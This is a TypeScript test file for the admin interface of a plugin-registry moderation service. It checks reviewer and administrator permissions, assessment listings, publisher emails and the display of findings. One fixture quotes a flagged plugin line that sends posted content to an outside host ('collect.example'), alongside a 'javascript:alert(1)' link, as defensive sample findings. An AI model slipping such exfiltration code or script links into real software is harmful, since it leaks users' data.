import { Toasty } from "@cloudflare/kumo";
import { i18n } from "@lingui/core";
import { I18nProvider } from "@lingui/react";
import { act, cleanup, fireEvent, render, screen, waitFor } from "@testing-library/react";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

import { App } from "../../src/admin/App.js";
// @ts-ignore -- Lingui generates this module before the UI test runs.
import { messages } from "../../src/admin/locales/en/messages.mjs";

const api = vi.hoisted(() => ({
	getSession: vi.fn(),
	getHealth: vi.fn(),
	getAssessments: vi.fn(),
	getAssessment: vi.fn(),
	getIssuance: vi.fn(),
	getActivity: vi.fn(),
	assessmentAction: vi.fn(),
	notifyPublisher: vi.fn(),
	setIssuance: vi.fn(),
	setTakedown: vi.fn(),
	assessmentMediaUrl: vi.fn(
		(runKey: string, kind: string, index: number) => `/media/${runKey}/${kind}/${index}`,
	),
}));

vi.mock("../../src/admin/api.js", () => api);

beforeEach(() => {
	Object.defineProperty(Element.prototype, "scrollIntoView", {
		configurable: true,
		value: vi.fn(),
	});
	Object.defineProperty(window, "scrollTo", { configurable: true, value: vi.fn() });
	window.history.replaceState(null, "", "/_admin");
	i18n.loadAndActivate({ locale: "en", messages });
	api.getSession.mockResolvedValue({
		authenticated: true,
		identity: {
			kind: "human",
			principal: "reviewer@example.com",
			actorDid: "did:web:labels.emdashcms.com:operators:test",
			roles: ["reviewer"],
		},
	});
	api.getHealth.mockResolvedValue({
		service: "emdash-labeler",
		status: "ok",
		discovery: { ready: true },
		signing: { ready: true },
	});
	api.getAssessments.mockResolvedValue({ items: [] });
	api.getIssuance.mockResolvedValue({ paused: false, updatedAt: null });
	api.getActivity.mockResolvedValue({ items: [] });
	api.assessmentAction.mockResolvedValue({});
	api.notifyPublisher.mockResolvedValue({});
});

afterEach(() => {
	cleanup();
	vi.clearAllMocks();
});

describe("labeler admin application", () => {
	it("shows reviewer workflows without administrator controls", async () => {
		render(
			<I18nProvider i18n={i18n}>
				<Toasty>
					<App />
				</Toasty>
			</I18nProvider>,
		);

		expect(await screen.findByText("EmDash registry")).toBeTruthy();
		expect(screen.getByText(/reviewer@example\.com/)).toBeTruthy();
		expect(screen.getByRole("button", { name: "Review" })).toBeTruthy();
		expect(screen.queryByRole("button", { name: "Takedowns" })).toBeNull();
		expect(screen.queryByRole("button", { name: "Evaluations" })).toBeNull();
	});

	it("does not expose evaluation tooling to administrators", async () => {
		window.history.replaceState(null, "", "/_admin/evaluations");
		api.getSession.mockResolvedValue({
			authenticated: true,
			identity: {
				kind: "human",
				principal: "admin@example.com",
				actorDid: "did:web:labels.emdashcms.com:operators:admin",
				roles: ["admin"],
			},
		});

		render(
			<I18nProvider i18n={i18n}>
				<Toasty>
					<App />
				</Toasty>
			</I18nProvider>,
		);

		expect(await screen.findByRole("heading", { name: "Overview" })).toBeTruthy();
		expect(screen.queryByRole("button", { name: "Evaluations" })).toBeNull();
	});

	it("does not render administrator controls at a direct URL for a reviewer", async () => {
		window.history.replaceState(null, "", "/_admin/takedowns");

		render(
			<I18nProvider i18n={i18n}>
				<Toasty>
					<App />
				</Toasty>
			</I18nProvider>,
		);

		expect(await screen.findByText("Administrator role required")).toBeTruthy();
		expect(screen.queryByRole("textbox", { name: "Subject URI" })).toBeNull();
	});

	it("does not append a stale page after switching assessment states", async () => {
		window.history.replaceState(null, "", "/_admin/assessments");
		let resolveStalePage: ((value: { items: unknown[] }) => void) | undefined;
		const stalePage = new Promise<{ items: unknown[] }>((resolve) => {
			resolveStalePage = resolve;
		});
		api.getAssessments.mockImplementation((state: string, cursor?: string) => {
			if (state === "review" && cursor) return stalePage;
			if (state === "review") {
				return Promise.resolve({
					items: [assessment("review-current", "review")],
					nextCursor: "next",
				});
			}
			return Promise.resolve({ items: [assessment("error-current", "error")] });
		});

		render(
			<I18nProvider i18n={i18n}>
				<Toasty>
					<App />
				</Toasty>
			</I18nProvider>,
		);

		expect(await screen.findByText("Review Current")).toBeTruthy();
		fireEvent.click(screen.getByRole("button", { name: "Load more" }));
		fireEvent.click(screen.getByRole("combobox", { name: "Assessment state" }));
		const errorOption = await screen.findByRole("option", { name: "Error" });
		fireEvent.pointerDown(errorOption);
		fireEvent.mouseDown(errorOption);
		fireEvent.pointerUp(errorOption);
		errorOption.click();
		expect(await screen.findByText("Error Current")).toBeTruthy();
		await act(async () => {
			resolveStalePage?.({ items: [assessment("review-stale", "review")] });
			await stalePage;
		});

		await waitFor(() => expect(screen.queryByText("Review Stale")).toBeNull());
	});

	it("renders the listing preview instead of raw subject identifiers", async () => {
		window.history.replaceState(null, "", "/_admin/assessments");
		const item = assessment("emdash-to-buffer", "review");
		api.getAssessments.mockResolvedValue({ items: [item] });
		api.getAssessment.mockResolvedValue({
			assessment: {
				...item,
				canonicalInput: {
					input: {
						name: "EmDash to Buffer",
						slug: "emdash-to-buffer",
						description: "Queue newly published EmDash posts to Buffer channels.",
						license: "MIT",
						keywords: ["buffer", "syndication", "social"],
						authors: [{ name: "Justin Thompson" }],
					},
				},
				summary: { reasonCodes: ["manual-positive-required"] },
				coverage: { text: "complete", links: "complete", media: "not-present" },
			},
			findings: [],
			manualDecision: null,
			publisherHandle: "justin.example",
		});

		render(
			<I18nProvider i18n={i18n}>
				<Toasty>
					<App />
				</Toasty>
			</I18nProvider>,
		);

		expect((await screen.findAllByText("EmDash to Buffer")).length).toBeGreaterThan(0);
		expect(screen.getByText("By Justin Thompson · @justin.example")).toBeTruthy();
		expect(screen.getByText("Queue newly published EmDash posts to Buffer channels.")).toBeTruthy();
		expect(screen.getByText("No findings")).toBeTruthy();
		expect(screen.getByText(/Review required ·/)).toBeTruthy();
		expect(screen.queryByText(item.subject_uri)).toBeNull();

		fireEvent.click(screen.getByRole("button", { name: "Approve and next" }));
		expect(await screen.findByRole("textbox", { name: "Note (optional)" })).toBeTruthy();
		const approveButtons = screen.getAllByRole("button", { name: "Approve and next" });
		const confirm = approveButtons.at(-1)!;
		expect(confirm.hasAttribute("disabled")).toBe(false);
		fireEvent.click(confirm);
		await waitFor(() => expect(api.assessmentAction).toHaveBeenCalledWith(item, "approve", ""));
	});
});

describe("recent assessments", () => {
	it("opens a passed assessment from the overview", async () => {
		const passed = {
			...assessment("passed-release", "passed"),
			subject_kind: "release",
			subject_uri: "at://did:plc:test/com.emdashcms.experimental.package.release/gallery:1.2.3",
			code_coverage: "complete",
			code_review_count: 2,
		};
		api.getAssessments.mockImplementation((state: string) =>
			Promise.resolve({ items: state === "all" || state === "passed" ? [passed] : [] }),
		);
		api.getAssessment.mockResolvedValue({
			assessment: {
				...passed,
				canonicalInput: { input: { slug: "gallery", version: "1.2.3" } },
				summary: { reasonCodes: ["automatic-pass"] },
				coverage: { text: "complete", links: "complete", media: "not-present", code: "complete" },
			},
			findings: [],
			manualDecision: null,
			publisherHandle: null,
		});

		render(
			<I18nProvider i18n={i18n}>
				<Toasty>
					<App />
				</Toasty>
			</I18nProvider>,
		);

		expect(await screen.findByText("Code reviewed by 2 models")).toBeTruthy();
		fireEvent.click(screen.getByRole("button", { name: /Gallery/ }));

		expect(await screen.findByRole("heading", { name: "Review queue" })).toBeTruthy();
		await waitFor(() => expect(api.getAssessment).toHaveBeenCalledWith("passed-release"));
		expect(await screen.findByText(/code: complete/)).toBeTruthy();
		expect(screen.queryByText("Operator decision required")).toBeNull();
		expect(screen.queryByText("No assessments")).toBeNull();
		expect(window.location.search).toBe("?state=passed");
	});
});

describe("emailing a publisher about code findings", () => {
	const item = assessment("gallery-release", "review");
	const draft = {
		recipients: ["security@example.test"],
		subject: "Review findings for Gallery 1.2.3 on the EmDash plugin registry",
		text: "1. Vulnerability (high severity)\n   A public route returns draft posts.",
	};

	function detail(record: null | { status: "sent"; recipients: string[]; sentAt: string }) {
		return {
			assessment: { ...item, canonicalInput: { input: { name: "Gallery", slug: "gallery" } } },
			findings: [],
			manualDecision: null,
			publisherNotification: { draft, record },
		};
	}

	function renderAs(roles: string[]) {
		window.history.replaceState(null, "", "/_admin/assessments");
		api.getSession.mockResolvedValue({
			authenticated: true,
			identity: { kind: "human", principal: "op@example.com", actorDid: "did:web:op", roles },
		});
		api.getAssessments.mockResolvedValue({ items: [item] });
		render(
			<I18nProvider i18n={i18n}>
				<Toasty>
					<App />
				</Toasty>
			</I18nProvider>,
		);
	}

	it("lets an administrator preview and send the email", async () => {
		api.getAssessment.mockResolvedValue(detail(null));
		renderAs(["admin"]);

		fireEvent.click(await screen.findByRole("button", { name: "Email publisher" }));
		expect(
			await screen.findByText(/to security@example\.test\. Your reason is recorded/),
		).toBeTruthy();
		expect(screen.getByText(draft.subject)).toBeTruthy();
		expect(screen.getByText(/A public route returns draft posts\./)).toBeTruthy();
		fireEvent.change(screen.getByRole("textbox", { name: "Reason" }), {
			target: { value: "Share the findings" },
		});
		fireEvent.click(screen.getAllByRole("button", { name: "Email publisher" }).at(-1)!);
		await waitFor(() =>
			expect(api.notifyPublisher).toHaveBeenCalledWith(item, "Share the findings"),
		);
	});

	it("hides the action from reviewers", async () => {
		api.getAssessment.mockResolvedValue(detail(null));
		renderAs(["reviewer"]);

		expect((await screen.findAllByText("Gallery")).length).toBeGreaterThan(0);
		expect(screen.queryByRole("button", { name: "Email publisher" })).toBeNull();
	});

	it("shows when the publisher was already emailed instead of offering to send again", async () => {
		api.getAssessment.mockResolvedValue(
			detail({ status: "sent", recipients: draft.recipients, sentAt: "2026-11-16T11:00:00.000Z" }),
		);
		renderAs(["admin"]);

		expect(await screen.findByText(/^Publisher emailed /)).toBeTruthy();
		expect(screen.queryByRole("button", { name: "Email publisher" })).toBeNull();
	});
});

describe("assessment findings", () => {
	it("shows who raised each finding, the cited code and the flagged link", async () => {
		window.history.replaceState(null, "", "/_admin/assessments");
		const item = assessment("gallery-release", "review");
		api.getAssessments.mockResolvedValue({ items: [item] });
		api.getAssessment.mockResolvedValue({
			assessment: {
				...item,
				canonicalInput: {
					input: {
						name: "Gallery",
						slug: "gallery",
						media: [
							{ kind: "screenshot", index: 0 },
							{ kind: "screenshot", index: 1 },
						],
					},
					text: [{ ref: "profile.name", value: "Gallery", format: "plain" }],
					links: [
						{
							ref: "profile.sections.faq.links[0]",
							url: "javascript:alert(1)",
							usage: "markdown",
							issues: ["unsupported-scheme"],
						},
					],
				},
				summary: {
					reasonCodes: ["policy-finding"],
					codeReviews: [
						{
							model: "anthropic/claude-opus-5-5",
							promptVersion: "v1",
							summary: "Posts leave the site.",
							findingCount: 1,
						},
						{
							model: "openai/gpt-6.1-sol",
							promptVersion: "v1",
							summary: "Flagged for possible biological risk.",
							findingCount: 0,
							declined: true,
						},
					],
				},
			},
			findings: [
				{
					finding_index: 0,
					category: "malicious-code",
					confidence: 0.9,
					reason_code: "policy-finding",
					public_summary: "Sends every published post to an undeclared host.",
					evidenceRefs: ["release.package:backend.js#L2"],
					severity: "critical",
					source: "anthropic/claude-opus-5-5",
					excerpts: [
						{
							ref: "release.package:backend.js#L2",
							startLine: 1,
							lines: ["export default {", "  fetch('https://collect.example', { body })", "};"],
						},
					],
					created_at: "2026-08-27T10:00:00.000Z",
				},
				{
					finding_index: 1,
					category: "malicious-or-deceptive-link",
					confidence: 1,
					reason_code: "policy-finding",
					public_summary: "Displayed link requires operator review.",
					evidenceRefs: ["profile.sections.faq.links[0]"],
					severity: null,
					source: "link-check",
					created_at: "2026-08-27T10:00:00.000Z",
				},
				{
					finding_index: 2,
					category: "explicit-sexual-content",
					confidence: 0.82,
					reason_code: "policy-finding",
					public_summary:
						"Clef scored explicit-sexual-content at 0.820, above its threshold of 0.45.",
					evidenceRefs: ["release.media.screenshot:1"],
					severity: null,
					source: "@cf/cloudflare/clef",
					created_at: "2026-08-27T10:00:00.000Z",
				},
			],
			manualDecision: null,
		});

		render(
			<I18nProvider i18n={i18n}>
				<Toasty>
					<App />
				</Toasty>
			</I18nProvider>,
		);

		expect(await screen.findByText("Posts leave the site.")).toBeTruthy();
		expect(screen.getByText("Declined to review")).toBeTruthy();
		expect(screen.getByText("Malicious code")).toBeTruthy();
		expect(screen.getByText("Critical")).toBeTruthy();
		expect(screen.getByText("anthropic/claude-opus-5-5 · 90% confidence")).toBeTruthy();
		expect(screen.getByText("backend.js:2")).toBeTruthy();
		expect(
			screen.getByText("fetch('https://collect.example', { body })", { exact: false }),
		).toBeTruthy();
		expect(screen.getByText("javascript:alert(1)")).toBeTruthy();
		expect(screen.getByText("link-check · 100% confidence")).toBeTruthy();
		expect(screen.getByText("Link check: unsupported-scheme")).toBeTruthy();
		expect(screen.getAllByRole("img", { name: "Submitted screenshot" })).toHaveLength(1);
		expect(screen.queryByRole("img", { name: "Flagged screenshot" })).toBeNull();
		const show = screen.getAllByRole("button", { name: "Show flagged image" });
		expect(show).toHaveLength(2);
		fireEvent.click(show[1]!);
		expect(screen.getByRole("img", { name: "Flagged screenshot" }).getAttribute("src")).toBe(
			"/media/gallery-release/screenshot/1",
		);
	});
});

function assessment(runKey: string, state: "review" | "error" | "passed") {
	return {
		run_key: runKey,
		subject_uri: `at://did:plc:test/profile/${runKey}`,
		subject_cid: `cid-${runKey}`,
		subject_kind: "profile",
		state,
		assessment_state: state,
		state_version: 1,
		policy_version: "v1",
		created_at: "2026-08-27T10:00:00.000Z",
		updated_at: "2026-08-27T10:00:00.000Z",
		completed_at: null,
	};
}
